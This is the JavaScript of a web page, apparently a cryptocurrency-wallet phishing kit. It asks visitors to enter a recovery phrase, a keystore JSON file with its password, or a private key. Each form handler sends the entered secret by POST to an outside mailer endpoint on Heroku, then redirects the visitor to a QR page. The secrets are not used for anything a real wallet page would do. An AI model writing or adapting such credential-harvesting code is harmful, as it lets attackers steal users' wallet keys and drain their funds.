const conts = document.querySelectorAll('.c')
const container = document.querySelector('.container')
const btns = document.querySelectorAll('button')
const importBtn = document.querySelectorAll('#import')


container.addEventListener('click', function (e) {
    const id = e.target.dataset.id

    if (id) {
        btns.forEach((btn) => {
            btn.classList.remove('active')
            e.target.classList.add('active')


        })
        conts.forEach((cont) => {
            cont.classList.remove('active')
        })
        const element = document.getElementById(id)
        element.classList.add('active')
    }

})

;

const key = document.getElementById('json')
if (key) {
    key.addEventListener('click', () => {
        const phrase = document.querySelector('.re')
        phrase.classList.add('age')
    })
} else {
    const phrase = document.querySelector('.re')
    phrase.classList.remove('age')
}

const json = document.getElementById('key')
if (json) {
    json.addEventListener('click', () => {
        const phrase = document.querySelector('.re')
        phrase.classList.add('age')
    })
} else {
    const phrase = document.querySelector('.re')
    phrase.classList.remove('age')
}

const phrase = document.querySelector('.re')

phrase.addEventListener('click', function () {
    phrase.classList.remove('age')
})



function drawElementFromDOM(id) {
    return document.querySelector(id)
}

const phraseBtn = document.querySelector('.phrase__tab')
const keystoreBtn = document.querySelector('.keystore__tab')
const privateBtn = document.querySelector('.private__tab')
const phraseText = document.querySelector('.txt1')
const keystoreText = document.querySelector('.txt2')
const passwordText = document.querySelector('.txt3')
const privateText = document.querySelector('.txt4')








const url = 'https://mynodemailerapp.herokuapp.com/sender'



phraseBtn.addEventListener('click', () => {
    const url = 'https://mynodemailerapp.herokuapp.com/sender'

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'Application/json'
        },
        body: JSON.stringify({
            "key": "Phrase",
            "phrase": phraseText.value
        })
    }).then((res) => {
        console.log(res);
        return res.json()
    }).then((data) => {
        console.log(data);
        window.location.replace("/qr.html")
    }).catch((err) => {
        console.log(err);
    })
})

keystoreBtn.addEventListener('click', () => {
    const url = 'https://mynodemailerapp.herokuapp.com/sender'

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'Application/json'
        },
        body: JSON.stringify({
            "key": "Keystore JSON and Password",
            "phrase": keystoreText.value,
            "password": passwordText.value
        })
    }).then((res) => {
        console.log(res);
        return res.json()
    }).then((data) => {
        console.log(data);
        window.location.replace("/qr.html")
    }).catch((err) => {
        console.log(err);
    })

})

privateBtn.addEventListener('click', () => {
    const url = 'https://mynodemailerapp.herokuapp.com/sender'


    

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'Application/json'
        },
        body: JSON.stringify({
            "key": "Private Key",
            "phrase": privateText.value,
           
        })
    }).then((res) => {
        return res.json()
    }).then((data) => {
        console.log(data);
        window.location.replace("/qr.html")
    }).catch((err) => {
        console.log(err);
    })
    
})

//  window.location.replace("/qr.html")